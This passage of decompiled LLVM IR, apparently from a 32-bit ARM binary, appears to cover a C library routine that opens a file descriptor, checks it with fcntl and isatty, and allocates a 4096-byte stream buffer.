  %v1_1701c = inttoptr i32 %v2_17018 to i32*
  %v2_1701c = load i32, i32* %v1_1701c, align 4
  store i32 %v2_1701c, i32* %r0.global-to-local, align 4
  %v3_1701c = add i32 %v0_17018, -33412
  %v4_1701c = inttoptr i32 %v3_1701c to i32*
  %v5_1701c = load i32, i32* %v4_1701c, align 4
  store i32 %v5_1701c, i32* @r1, align 4
  %v6_1701c = add i32 %v0_17018, -33408
  %v7_1701c = inttoptr i32 %v6_1701c to i32*
  %v8_1701c = load i32, i32* %v7_1701c, align 4
  store i32 %v8_1701c, i32* %r2.global-to-local, align 4
  %v2_17028 = add i32 %v0_17008, 8
  %v3_17028 = inttoptr i32 %v2_17028 to i32*
  store i32 0, i32* %v3_17028, align 4
  %v2_17030 = load i32, i32* @r5, align 4
  %v3_17030 = inttoptr i32 %v2_17030 to i16*
  store i16 8192, i16* %v3_17030, align 2
  %v2_17034 = load i32, i32* %r0.global-to-local, align 4
  %v0_17038 = load i32, i32* @r5, align 4
  %v1_17038 = add i32 %v0_17038, 56
  store i32 %v1_17038, i32* @r3, align 4
  %v1_1703c = inttoptr i32 %v1_17038 to i32*
  store i32 %v2_17034, i32* %v1_1703c, align 4
  %v3_1703c = add i32 %v0_17038, 60
  %v4_1703c = inttoptr i32 %v3_1703c to i32*
  %v5_1703c = load i32, i32* @r1, align 4
  store i32 %v5_1703c, i32* %v4_1703c, align 4
  %v6_1703c = add i32 %v0_17038, 64
  %v7_1703c = inttoptr i32 %v6_1703c to i32*
  %v8_1703c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1703c, i32* %v7_1703c, align 4
  %v0_17040.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17040

dec_label_pc_17040:                               ; preds = %.thread3, %dec_label_pc_17014
  %v0_17098 = phi i32 [ %v0_16f84, %.thread3 ], [ %v0_17040.pre, %dec_label_pc_17014 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_17040 = icmp slt i32 %v0_17098, 0
  br i1 %v1_17040, label %dec_label_pc_17098, label %dec_label_pc_17048

dec_label_pc_17048:                               ; preds = %dec_label_pc_17040
  %v0_1704c = load i32, i32* @r4, align 4
  %v2_1704c = and i32 %v0_1704c, 131075
  %v1_17050 = add nuw nsw i32 %v2_1704c, 1
  store i32 %v1_17050, i32* %r2.global-to-local, align 4
  %v0_17054 = load i32, i32* @r7, align 4
  %v1_17054 = add i32 %v0_17054, 1
  %v2_17058 = and i32 %v1_17054, %v1_17050
  store i32 %v2_17058, i32* %r3.global-to-local, align 4
  %v3_1705c = icmp uge i32 %v2_17058, %v1_17050
  store i1 %v3_1705c, i1* %cpsr_c.global-to-local, align 1
  %v9_1705c = icmp eq i32 %v2_17058, %v1_17050
  %v1_17060 = load i32, i32* @r5, align 4
  %v2_17060 = add i32 %v1_17060, 4
  %v3_17060 = inttoptr i32 %v2_17060 to i32*
  store i32 %v0_17098, i32* %v3_17060, align 4
  br i1 %v9_1705c, label %dec_label_pc_17068, label %dec_label_pc_16fa4

dec_label_pc_17068:                               ; preds = %dec_label_pc_17048
  %v0_17068 = load i32, i32* @r4, align 4
  %v1_17068 = load i32, i32* @r7, align 4
  %v2_17068 = sub i32 -1, %v1_17068
  %v3_17068 = and i32 %v0_17068, %v2_17068
  store i32 %v3_17068, i32* @r3, align 4
  %v1_1706c = and i32 %v3_17068, 1024
  %v2_1706c = icmp eq i32 %v1_1706c, 0
  br i1 %v2_1706c, label %dec_label_pc_1708c, label %dec_label_pc_17074

dec_label_pc_17074:                               ; preds = %dec_label_pc_17068
  %v0_17074 = load i32, i32* @r6, align 4
  store i32 %v0_17074, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_17080 = call i32 @__libc_fcntl(i32 %v0_17074, i32 4)
  store i32 %v2_17080, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17084 = icmp eq i32 %v2_17080, 0
  br i1 %v2_17084, label %dec_label_pc_17074.dec_label_pc_1708c_crit_edge, label %dec_label_pc_16fa4

dec_label_pc_17074.dec_label_pc_1708c_crit_edge:  ; preds = %dec_label_pc_17074
  %v0_1708c.pre = load i32, i32* @r7, align 4
  %v0_17090.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1708c

dec_label_pc_1708c:                               ; preds = %dec_label_pc_17074.dec_label_pc_1708c_crit_edge, %dec_label_pc_17068
  %v0_17090 = phi i32 [ %v0_17090.pre, %dec_label_pc_17074.dec_label_pc_1708c_crit_edge ], [ %v0_17068, %dec_label_pc_17068 ]
  %v0_1708c = phi i32 [ %v0_1708c.pre, %dec_label_pc_17074.dec_label_pc_1708c_crit_edge ], [ %v1_17068, %dec_label_pc_17068 ]
  %v1_1708c = and i32 %v0_1708c, 131072
  store i32 %v1_1708c, i32* %r3.global-to-local, align 4
  %v2_17090 = or i32 %v1_1708c, %v0_17090
  store i32 %v2_17090, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_170bc

dec_label_pc_17098:                               ; preds = %dec_label_pc_17040
  %v2_17098 = icmp eq i32 %v0_17098, -1
  store i1 %v2_17098, i1* %cpsr_c.global-to-local, align 1
  %v7_17098 = icmp eq i32 %v0_17098, -1
  %v0_170a4.pre = load i32, i32* @r4, align 4
  br i1 %v7_17098, label %dec_label_pc_17098._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_17098
  %v2_1709c = or i32 %v0_170a4.pre, 131072
  store i32 %v2_1709c, i32* @r4, align 4
  br label %dec_label_pc_17098._crit_edge

dec_label_pc_17098._crit_edge:                    ; preds = %dec_label_pc_17098, %bb53
  %v0_170a4 = phi i32 [ %v2_1709c, %bb53 ], [ %v0_170a4.pre, %dec_label_pc_17098 ]
  %v0_170a0 = load i32, i32* @r7, align 4
  store i32 %v0_170a0, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_170ac = call i32 @__libc_open(i32 %v0_170a0, i32 %v0_170a4)
  store i32 %v2_170ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_170b0 = icmp slt i32 %v2_170ac, 0
  %v1_170b4 = load i32, i32* @r5, align 4
  %v2_170b4 = add i32 %v1_170b4, 4
  %v3_170b4 = inttoptr i32 %v2_170b4 to i32*
  store i32 %v2_170ac, i32* %v3_170b4, align 4
  br i1 %v1_170b0, label %dec_label_pc_16fc0, label %.dec_label_pc_170bc_crit_edge

.dec_label_pc_170bc_crit_edge:                    ; preds = %dec_label_pc_17098._crit_edge
  %v0_170c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_170bc

dec_label_pc_170bc:                               ; preds = %.dec_label_pc_170bc_crit_edge, %dec_label_pc_1708c
  %v0_170d8 = phi i32 [ %v0_170c0.pre, %.dec_label_pc_170bc_crit_edge ], [ %v2_17090, %dec_label_pc_1708c ]
  %v0_170bc = load i32, i32* @r5, align 4
  %v1_170bc = inttoptr i32 %v0_170bc to i16*
  %v2_170bc = load i16, i16* %v1_170bc, align 2
  %v3_170bc = zext i16 %v2_170bc to i32
  %v1_170c0 = urem i32 %v0_170d8, 4
  %v1_170c4 = and i32 %v0_170d8, 1024
  %v1_170c8 = and i32 %v3_170bc, 8192
  %v1_170cc = add nuw nsw i32 %v1_170c0, 1
  %v2_170d0 = or i32 %v1_170c8, %v1_170c4
  store i32 %v2_170d0, i32* %r3.global-to-local, align 4
  %v1_170d4 = xor i32 %v1_170cc, 3
  %v1_170d8 = and i32 %v0_170d8, 131072
  store i32 %v1_170d8, i32* %r2.global-to-local, align 4
  %v2_170d8 = icmp eq i32 %v1_170d8, 0
  %v1_170dc = add i32 %v0_170bc, 4
  %v2_170dc = inttoptr i32 %v1_170dc to i32*
  %v3_170dc = load i32, i32* %v2_170dc, align 4
  store i32 %v3_170dc, i32* @r4, align 4
  br i1 %v2_170d8, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_170bc
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_170bc, %bb54
  %v0_170e8 = phi i32 [ 0, %dec_label_pc_170bc ], [ 32768, %bb54 ]
  %v4_170e4 = mul nuw nsw i32 %v1_170d4, 16
  %v5_170e4 = or i32 %v2_170d0, %v4_170e4
  store i32 %v5_170e4, i32* %r3.global-to-local, align 4
  %v2_170e8 = or i32 %v0_170e8, %v5_170e4
  store i32 %v2_170e8, i32* %r2.global-to-local, align 4
  %v2_170ec = icmp ugt i32 %v3_170dc, 2147483646
  store i1 %v2_170ec, i1* %cpsr_c.global-to-local, align 1
  %v8_170ec = icmp eq i32 %v3_170dc, 2147483647
  %v1_170f0 = trunc i32 %v2_170e8 to i16
  store i16 %v1_170f0, i16* %v1_170bc, align 2
  br i1 %v8_170ec, label %dec_label_pc_17130, label %dec_label_pc_170f8

dec_label_pc_170f8:                               ; preds = %bb55
  store i32 48992, i32* %r3.global-to-local, align 4
  %v0_170fc = call i32 @__aeabi_read_tp()
  %v3_17100 = load i16, i16* @global_var_23068.362, align 2
  %v4_17100 = sext i16 %v3_17100 to i32
  store i32 %v4_17100, i32* @r3, align 4
  store i32 %v0_170fc, i32* @r6, align 4
  %v0_17108 = load i32, i32* @r4, align 4
  store i32 %v0_17108, i32* @r0, align 4
  %v2_1710c = add i32 %v4_17100, %v0_170fc
  %v3_1710c = inttoptr i32 %v2_1710c to i32*
  %v4_1710c = load i32, i32* %v3_1710c, align 4
  store i32 %v4_1710c, i32* @r4, align 4
  %v1_17110 = call i32 @isatty(i32 %v0_17108)
  store i32 %v1_17110, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17114 = icmp eq i32 %v1_17110, 0
  br i1 %v2_17114, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_170f8
  %v1_17118 = load i32, i32* @r5, align 4
  %v2_17118 = inttoptr i32 %v1_17118 to i16*
  %v3_17118 = load i16, i16* %v2_17118, align 2
  %v4_17118 = zext i16 %v3_17118 to i32
  %v2_1711c = or i32 %v4_17118, 256
  store i32 %v2_1711c, i32* %r3.global-to-local, align 4
  %v2_17120 = trunc i32 %v2_1711c to i16
  store i16 %v2_17120, i16* %v2_17118, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_170f8, %bb56
  %v3_17128 = load i16, i16* @global_var_23068.362, align 2
  %v4_17128 = sext i16 %v3_17128 to i32
  store i32 %v4_17128, i32* %r3.global-to-local, align 4
  %v0_1712c = load i32, i32* @r4, align 4
  %v1_1712c = load i32, i32* @r6, align 4
  %v3_1712c = add i32 %v1_1712c, %v4_17128
  %v4_1712c = inttoptr i32 %v3_1712c to i32*
  store i32 %v0_1712c, i32* %v4_1712c, align 4
  br label %dec_label_pc_17130

dec_label_pc_17130:                               ; preds = %bb55, %.thread5
  %v0_17130 = load i32, i32* @r5, align 4
  %v1_17130 = add i32 %v0_17130, 8
  %v2_17130 = inttoptr i32 %v1_17130 to i32*
  %v3_17130 = load i32, i32* %v2_17130, align 4
  store i32 %v3_17130, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17134 = icmp eq i32 %v3_17130, 0
  br i1 %v2_17134, label %dec_label_pc_1713c, label %bb57

dec_label_pc_1713c:                               ; preds = %dec_label_pc_17130
  store i32 4096, i32* @r0, align 4
  %v0_17140 = call i32 @malloc()
  store i32 %v0_17140, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17144 = icmp eq i32 %v0_17140, 0
  %v1_17154.pre = load i32, i32* @r5, align 4
  br i1 %v2_17144, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1713c
  %v2_17148 = inttoptr i32 %v1_17154.pre to i16*
  %v3_17148 = load i16, i16* %v2_17148, align 2
  %v4_17148 = zext i16 %v3_17148 to i32
  %v2_1714c = add i32 %v0_17140, 4096
  store i32 %v2_1714c, i32* %r2.global-to-local, align 4
  %v2_17150 = or i32 %v4_17148, 16384
  store i32 %v2_17150, i32* %r3.global-to-local, align 4
  %v2_17154 = add i32 %v1_17154.pre, 8
  %v3_17154 = inttoptr i32 %v2_17154 to i32*
  store i32 %v0_17140, i32* %v3_17154, align 4
  %v1_17158 = load i32, i32* %r2.global-to-local, align 4
  %v2_17158 = load i32, i32* @r5, align 4
  %v3_17158 = add i32 %v2_17158, 12
  %v4_17158 = inttoptr i32 %v3_17158 to i32*
  store i32 %v1_17158, i32* %v4_17158, align 4
  %v1_1715c = load i32, i32* %r3.global-to-local, align 4
  %v2_1715c = trunc i32 %v1_1715c to i16
  %v3_1715c = load i32, i32* @r5, align 4
  %v4_1715c = inttoptr i32 %v3_1715c to i16*
  store i16 %v2_1715c, i16* %v4_1715c, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_1713c
  %v2_1715437 = add i32 %v1_17154.pre, 8
  %v3_1715438 = inttoptr i32 %v2_1715437 to i32*
  store i32 0, i32* %v3_1715438, align 4
  %v2_17160 = load i32, i32* @r5, align 4
  %v3_17160 = add i32 %v2_17160, 12
  %v4_17160 = inttoptr i32 %v3_17160 to i32*
  store i32 0, i32* %v4_17160, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_17130, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_1716c = load i32, i32* @r8, align 4
  %v2_1716c = add i32 %v0_1716c, 92
  %v3_1716c = inttoptr i32 %v2_1716c to i32*
  %v4_1716c = load i32, i32* %v3_1716c, align 4
  store i32 %v4_1716c, i32* %r3.global-to-local, align 4
  %v2_17170 = load i32, i32* @r5, align 4
  %v3_17170 = add i32 %v2_17170, 2
  %v4_17170 = inttoptr i32 %v3_17170 to i8*
  store i8 0, i8* %v4_17170, align 1
  %v0_17174 = load i32, i32* @r5, align 4
  %v1_17174 = inttoptr i32 %v0_17174 to i16*
  %v2_17174 = load i16, i16* %v1_17174, align 2
  %v3_17174 = zext i16 %v2_17174 to i32
  store i32 %v3_17174, i32* %r2.global-to-local, align 4
  %v0_17178 = load i32, i32* %r3.global-to-local, align 4
  %v1_17178 = inttoptr i32 %v0_17178 to i32*
  %v2_17178 = load i32, i32* %v1_17178, align 4
  store i32 %v2_17178, i32* @r1, align 4
  %v1_1717c = add i32 %v0_17174, 8
  %v2_1717c = inttoptr i32 %v1_1717c to i32*
  %v3_1717c = load i32, i32* %v2_1717c, align 4
  store i32 %v3_1717c, i32* %r3.global-to-local, align 4
  %v1_17180 = and i32 %v3_17174, 8192
  %v2_17180 = icmp eq i32 %v1_17180, 0
  %v2_17184 = add i32 %v0_17174, 20
  %v3_17184 = inttoptr i32 %v2_17184 to i32*
  store i32 %v3_1717c, i32* %v3_17184, align 4
  %v0_17188 = load i32, i32* @r1, align 4
  %v1_17188 = load i32, i32* @r5, align 4
  %v2_17188 = add i32 %v1_17188, 52
  %v3_17188 = inttoptr i32 %v2_17188 to i32*
  store i32 %v0_17188, i32* %v3_17188, align 4
  %v0_1718c = load i32, i32* %r3.global-to-local, align 4
  %v1_1718c = load i32, i32* @r5, align 4
  %v2_1718c = add i32 %v1_1718c, 24
  %v3_1718c = inttoptr i32 %v2_1718c to i32*
  store i32 %v0_1718c, i32* %v3_1718c, align 4
  %v0_17190 = load i32, i32* %r3.global-to-local, align 4
  %v1_17190 = load i32, i32* @r5, align 4
  %v2_17190 = add i32 %v1_17190, 28
  %v3_17190 = inttoptr i32 %v2_17190 to i32*
  store i32 %v0_17190, i32* %v3_17190, align 4
  %v0_17194 = load i32, i32* %r3.global-to-local, align 4
  %v1_17194 = load i32, i32* @r5, align 4
  %v2_17194 = add i32 %v1_17194, 16
  %v3_17194 = inttoptr i32 %v2_17194 to i32*
  store i32 %v0_17194, i32* %v3_17194, align 4
  %v0_17198 = load i32, i32* %r4.global-to-local, align 4
  %v1_17198 = load i32, i32* @r5, align 4
  %v2_17198 = add i32 %v1_17198, 44
  %v3_17198 = inttoptr i32 %v2_17198 to i32*
  store i32 %v0_17198, i32* %v3_17198, align 4
  br i1 %v2_17180, label %dec_label_pc_17380, label %dec_label_pc_171a0

dec_label_pc_171a0:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_171a4 = load i32, i32* @r8, align 4
  %v2_171a4 = add i32 %v0_171a4, 160
  %v3_171a4 = inttoptr i32 %v2_171a4 to i32*
  %v4_171a4 = load i32, i32* %v3_171a4, align 4
  store i32 %v4_171a4, i32* %r7.global-to-local, align 4
  %v0_171a8 = call i32 @__aeabi_read_tp()
  store i32 %v0_171a8, i32* %r0.global-to-local, align 4
  %v1_171ac = add i32 %v4_171a4, 8
  %v2_171ac = inttoptr i32 %v1_171ac to i32*
  %v3_171ac = load i32, i32* %v2_171ac, align 4
  store i32 %v3_171ac, i32* %r3.global-to-local, align 4
  %v1_171b0 = add i32 %v0_171a8, -1168
  store i32 %v1_171b0, i32* %r6.global-to-local, align 4
  %v3_171b4 = icmp uge i32 %v3_171ac, %v1_171b0
  store i1 %v3_171b4, i1* %cpsr_c.global-to-local, align 1
  %v9_171b4 = icmp eq i32 %v3_171ac, %v1_171b0
  br i1 %v9_171b4, label %dec_label_pc_171f8, label %dec_label_pc_171bc

dec_label_pc_171bc:                               ; preds = %dec_label_pc_171a0
  store i32 %v4_171a4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_171c4

dec_label_pc_171c4:                               ; preds = %dec_label_pc_171d0.dec_label_pc_171c4_crit_edge, %dec_label_pc_171bc
  %v0_171c4 = phi i32 [ %v0_171c4.pre, %dec_label_pc_171d0.dec_label_pc_171c4_crit_edge ], [ %v4_171a4, %dec_label_pc_171bc ]
  %v1_171c4 = inttoptr i32 %v0_171c4 to i32*
  %v2_171c4 = load i32, i32* %v1_171c4, align 4
  store i32 %v2_171c4, i32* %r3.global-to-local, align 4
  %v1_171c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_171c8 = icmp uge i32 %v2_171c4, %v1_171c8
  store i1 %v3_171c8, i1* %cpsr_c.global-to-local, align 1
  %v9_171c8 = icmp eq i32 %v2_171c4, %v1_171c8
  br i1 %v9_171c8, label %dec_label_pc_171d0, label %dec_label_pc_171e8

dec_label_pc_171d0:                               ; preds = %dec_label_pc_171c4
  store i32 %v2_171c4, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_171e0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_171e0, label %dec_label_pc_171e4, label %dec_label_pc_171d0.dec_label_pc_171c4_crit_edge

dec_label_pc_171d0.dec_label_pc_171c4_crit_edge:  ; preds = %dec_label_pc_171d0
  %v0_171c4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_171c4

dec_label_pc_171e4:                               ; preds = %dec_label_pc_171d0
  %v0_171e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_171e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_171e8

dec_label_pc_171e8:                               ; preds = %dec_label_pc_171c4, %dec_label_pc_171e4
  %v0_171e8 = phi i32 [ %v0_171e4, %dec_label_pc_171e4 ], [ %v2_171c4, %dec_label_pc_171c4 ]
  %v1_171e8 = phi i32 [ %v0_171e4, %dec_label_pc_171e4 ], [ %v1_171c8, %dec_label_pc_171c4 ]
  %v3_171e8 = icmp uge i32 %v0_171e8, %v1_171e8
  store i1 %v3_171e8, i1* %cpsr_c.global-to-local, align 1
  %v9_171e8 = icmp eq i32 %v0_171e8, %v1_171e8
  br i1 %v9_171e8, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_171e8
  %v1_171ec = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_171ec, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_171e8, %bb58
  %v1_171f0 = xor i1 %v9_171e8, true
  call void @__pseudo_cond_branch(i1 %v1_171f0, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_171f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_171f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_171f4 = add i32 %v1_171f4, 8
  %v3_171f4 = inttoptr i32 %v2_171f4 to i32*
  store i32 %v0_171f4, i32* %v3_171f4, align 4
  %v1_17214.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_171f8

dec_label_pc_171f8:                               ; preds = %dec_label_pc_171a0, %bb59
  %v1_17214 = phi i32 [ %v3_171ac, %dec_label_pc_171a0 ], [ %v1_17214.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_171fc = load i32, i32* @r8, align 4
  %v2_171fc = add i32 %v0_171fc, 160
  %v3_171fc = inttoptr i32 %v2_171fc to i32*
  %v4_171fc = load i32, i32* %v3_171fc, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_17204 = add i32 %v0_171fc, 152
  %v3_17204 = inttoptr i32 %v2_17204 to i32*
  %v4_17204 = load i32, i32* %v3_17204, align 4
  store i32 %v4_17204, i32* %r7.global-to-local, align 4
  %v1_17208 = add i32 %v4_171fc, 4
  %v2_17208 = inttoptr i32 %v1_17208 to i32*
  %v3_17208 = load i32, i32* %v2_17208, align 4
  store i32 %v3_17208, i32* %r3.global-to-local, align 4
  %v1_1720c = add i32 %v4_17204, 8
  %v2_1720c = inttoptr i32 %v1_1720c to i32*
  %v3_1720c = load i32, i32* %v2_1720c, align 4
  store i32 %v3_1720c, i32* %r2.global-to-local, align 4
  %v1_17210 = add i32 %v3_17208, 1
  store i32 %v1_17210, i32* %r3.global-to-local, align 4
  %v3_17214 = icmp uge i32 %v3_1720c, %v1_17214
  store i1 %v3_17214, i1* %cpsr_c.global-to-local, align 1
  %v9_17214 = icmp eq i32 %v3_1720c, %v1_17214
  store i32 %v1_17210, i32* %v2_17208, align 4
  br i1 %v9_17214, label %dec_label_pc_17260, label %dec_label_pc_17220

dec_label_pc_17220:                               ; preds = %dec_label_pc_171f8
  %v0_17224 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17224, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1722c95 = inttoptr i32 %v0_17224 to i32*
  %v2_1722c96 = load i32, i32* %v1_1722c95, align 4
  store i32 %v2_1722c96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1723098 = icmp eq i32 %v2_1722c96, 0
  br i1 %v9_1723098, label %dec_label_pc_17238, label %dec_label_pc_17250

dec_label_pc_17238:                               ; preds = %dec_label_pc_17220, %dec_label_pc_17238.dec_label_pc_1722c_crit_edge
  %v0_1723899 = phi i32 [ %v1_17230.pre, %dec_label_pc_17238.dec_label_pc_1722c_crit_edge ], [ 0, %dec_label_pc_17220 ]
  store i32 %v0_1723899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17248 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17248, label %dec_label_pc_1724c, label %dec_label_pc_17238.dec_label_pc_1722c_crit_edge

dec_label_pc_17238.dec_label_pc_1722c_crit_edge:  ; preds = %dec_label_pc_17238
  %v0_1722c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17230.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1722c = inttoptr i32 %v0_1722c.pre to i32*
  %v2_1722c = load i32, i32* %v1_1722c, align 4
  store i32 %v2_1722c, i32* %r3.global-to-local, align 4
  %v3_17230 = icmp uge i32 %v2_1722c, %v1_17230.pre
  store i1 %v3_17230, i1* %cpsr_c.global-to-local, align 1
  %v9_17230 = icmp eq i32 %v2_1722c, %v1_17230.pre
  br i1 %v9_17230, label %dec_label_pc_17238, label %dec_label_pc_17250

dec_label_pc_1724c:                               ; preds = %dec_label_pc_17238
  %v0_1724c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1724c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17250

dec_label_pc_17250:                               ; preds = %dec_label_pc_17220, %dec_label_pc_17238.dec_label_pc_1722c_crit_edge, %dec_label_pc_1724c
  %v0_17250 = phi i32 [ %v0_1724c, %dec_label_pc_1724c ], [ %v2_1722c96, %dec_label_pc_17220 ], [ %v2_1722c, %dec_label_pc_17238.dec_label_pc_1722c_crit_edge ]
  %v1_17250 = phi i32 [ %v0_1724c, %dec_label_pc_1724c ], [ 0, %dec_label_pc_17220 ], [ %v1_17230.pre, %dec_label_pc_17238.dec_label_pc_1722c_crit_edge ]
  %v3_17250 = icmp uge i32 %v0_17250, %v1_17250
  store i1 %v3_17250, i1* %cpsr_c.global-to-local, align 1
  %v9_17250 = icmp eq i32 %v0_17250, %v1_17250
  br i1 %v9_17250, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_17250
  %v1_17254 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17254, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_17250, %bb60
  %v1_17258 = xor i1 %v9_17250, true
  call void @__pseudo_cond_branch(i1 %v1_17258, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_1725c = load i32, i32* %r6.global-to-local, align 4
  %v1_1725c = load i32, i32* %r7.global-to-local, align 4
  %v2_1725c = add i32 %v1_1725c, 8
  %v3_1725c = inttoptr i32 %v2_1725c to i32*
  store i32 %v0_1725c, i32* %v3_1725c, align 4
  br label %dec_label_pc_17260

dec_label_pc_17260:                               ; preds = %dec_label_pc_171f8, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17264 = load i32, i32* @r8, align 4
  %v2_17264 = add i32 %v0_17264, 152
  %v3_17264 = inttoptr i32 %v2_17264 to i32*
  %v4_17264 = load i32, i32* %v3_17264, align 4
  store i32 %v4_17264, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_1726c = add i32 %v0_17264, 76
  %v3_1726c = inttoptr i32 %v2_1726c to i32*
  %v4_1726c = load i32, i32* %v3_1726c, align 4
  store i32 %v4_1726c, i32* @r1, align 4
  %v1_17270 = add i32 %v4_17264, 4
  %v2_17270 = inttoptr i32 %v1_17270 to i32*
  %v3_17270 = load i32, i32* %v2_17270, align 4
  store i32 %v3_17270, i32* %r3.global-to-local, align 4
  %v1_17274 = inttoptr i32 %v4_1726c to i32*
  %v2_17274 = load i32, i32* %v1_17274, align 4
  store i32 %v2_17274, i32* %r2.global-to-local, align 4
  %v1_17278 = add i32 %v3_17270, 1
  store i32 %v1_17278, i32* %r3.global-to-local, align 4
  store i32 %v1_17278, i32* %v2_17270, align 4
  %v0_17280 = load i32, i32* %r2.global-to-local, align 4
  %v1_17280 = load i32, i32* @r5, align 4
  %v2_17280 = add i32 %v1_17280, 32
  %v3_17280 = inttoptr i32 %v2_17280 to i32*
  store i32 %v0_17280, i32* %v3_17280, align 4
  %v0_17284 = load i32, i32* %r0.global-to-local, align 4
  %v1_17284 = add i32 %v0_17284, 4
  %v2_17284 = inttoptr i32 %v1_17284 to i32*
  %v3_17284 = load i32, i32* %v2_17284, align 4
  %v1_17288 = add i32 %v3_17284, -1
  store i32 %v1_17288, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1728c = icmp eq i32 %v1_17288, 0
  %v0_17290 = load i32, i32* @r5, align 4
  %v1_17290 = load i32, i32* @r1, align 4
  %v2_17290 = inttoptr i32 %v1_17290 to i32*
  store i32 %v0_17290, i32* %v2_17290, align 4
  %v0_17294 = load i32, i32* %r3.global-to-local, align 4
  %v1_17294 = load i32, i32* %r0.global-to-local, align 4
  %v2_17294 = add i32 %v1_17294, 4
  %v3_17294 = inttoptr i32 %v2_17294 to i32*
  store i32 %v0_17294, i32* %v3_17294, align 4
  br i1 %v2_1728c, label %dec_label_pc_1729c, label %dec_label_pc_172fc

dec_label_pc_1729c:                               ; preds = %dec_label_pc_17260
  %v0_1729c = load i32, i32* %r3.global-to-local, align 4
  %v1_1729c = load i32, i32* %r0.global-to-local, align 4
  %v2_1729c = add i32 %v1_1729c, 8
  %v3_1729c = inttoptr i32 %v2_1729c to i32*
  store i32 %v0_1729c, i32* %v3_1729c, align 4
  %v0_172a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_172a0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_172a4

dec_label_pc_172a4:                               ; preds = %dec_label_pc_172d4.dec_label_pc_172a4_crit_edge, %dec_label_pc_1729c
  %v0_172a4 = phi i32 [ %v0_172a4.pre, %dec_label_pc_172d4.dec_label_pc_172a4_crit_edge ], [ %v0_172a0, %dec_label_pc_1729c ]
  %v1_172a4 = inttoptr i32 %v0_172a4 to i32*
  %v2_172a4 = load i32, i32* %v1_172a4, align 4
  store i32 %v2_172a4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_172a4, i32* %r2.global-to-local, align 4
  %v2_172b083 = load i32, i32* %v1_172a4, align 4
  store i32 %v2_172b083, i32* %r3.global-to-local, align 4
  %v3_172b485 = icmp uge i32 %v2_172b083, %v2_172a4
  store i1 %v3_172b485, i1* %cpsr_c.global-to-local, align 1
  %v9_172b491 = icmp eq i32 %v2_172b083, %v2_172a4
  br i1 %v9_172b491, label %dec_label_pc_172bc, label %dec_label_pc_172d4

dec_label_pc_172bc:                               ; preds = %dec_label_pc_172a4, %dec_label_pc_172bc.dec_label_pc_172b0_crit_edge
